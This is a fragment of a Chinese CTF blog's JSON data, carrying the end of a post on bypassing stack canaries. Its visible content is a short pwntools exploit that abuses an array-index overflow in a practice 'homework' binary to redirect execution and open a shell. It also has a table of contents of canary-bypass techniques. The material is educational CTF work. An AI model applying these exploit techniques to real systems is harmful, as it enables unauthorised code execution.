class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;gnome-terminal&#x27;</span>,<span class=\"string\">&#x27;-x&#x27;</span>,<span class=\"string\">&#x27;bash&#x27;</span>,<span class=\"string\">&#x27;-c&#x27;</span>]</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./homework&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./homework&#x27;</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;aaaa&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;4 &gt; dump all numbers&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot; &gt; &quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Index to edit: &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;14&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;How many? &quot;</span>)</span><br><span class=\"line\">system_addr = <span class=\"number\">0x080485FB</span></span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(system_addr))</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://s2.loli.net/2021/12/11/puVWbNdHeQOwv4K.png\" alt=\"image.png\"></p>\n","feature":true,"text":"文章首发于安全客 简介canary保护又称金丝雀保护，作用是为了防止栈溢出的一种保护机制。工作原理是从fs/gs寄存器取值放在rbp-4或者rbp-8的位置（32位/64位），当用户输入结束后，程序会从rbp-4或者rbp-8的位置取出并与fs/gs寄存器对应位置的值进行比较，如...","link":"","photos":[],"count_time":{"symbolsCount":"8.4k","symbolsTime":"8 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">简介</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#leak%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">leak绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#one-by-one%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">one by one爆破</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bin1\"><span class=\"toc-text\">bin1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssp%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">ssp攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#smashes\"><span class=\"toc-text\">smashes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8A%AB%E6%8C%81-stack-chk-fail\"><span class=\"toc-text\">劫持___stack_chk_fail</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-r2t4\"><span class=\"toc-text\">[BJDCTF 2nd]r2t4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9TLS%E7%BB%93%E6%9E%84%E4%BD%93\"><span class=\"toc-text\">修改TLS结构体</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTF2018-babystack\"><span class=\"toc-text\">CTF2018 babystack</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C\"><span class=\"toc-text\">数组下标越界</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#homework\"><span class=\"toc-text\">homework</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-5\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"堆风水与堆排布","uid":"f86621641a641a4d6db180a8f81d528f","slug":"堆风水与堆排布","date":"2022-01-14T01:50:00.000Z","updated":"2022-01-14T14:11:01.408Z","comments":true,"path":"api/articles/堆风水与堆排布.json","keywords":null,"cover":"https://s2.loli.net/2022/01/14/nzTZPVIb1c3B8WO.jpg","text":"介绍所谓堆风水也叫作堆排布，其实说严格了并不是一种漏洞的利用方法，而是一种灵活布置堆块来控制堆布局的方法，在一些其他漏洞的利用中起到效果。接下来拿由清华蓝莲花战队出的babyfengshui来讲一下。 babyfengshui分析检查一下保护机制，32位，没有开pie保护 接下来...","link":"","photos":[],"count_time":{"symbolsCount":"3.1k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":4,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":4,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"off-by-one","uid":"bd9db8b2380b14fbad4621ba09b4c803","slug":"off-by-one","date":"2021-12-03T13:24:02.000Z","updated":"2021-12-26T12:50:48.560Z","comments":true,"path":"api/articles/off-by-one.json","keywords":null,"cover":"https://s2.loli.net/2021/12/26/8dARZTCroeUzIg5.jpg","text":"介绍off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。这个字节可能是任意可控的或者是NULL字节。以下是对两种情况的利用方法 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":3,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}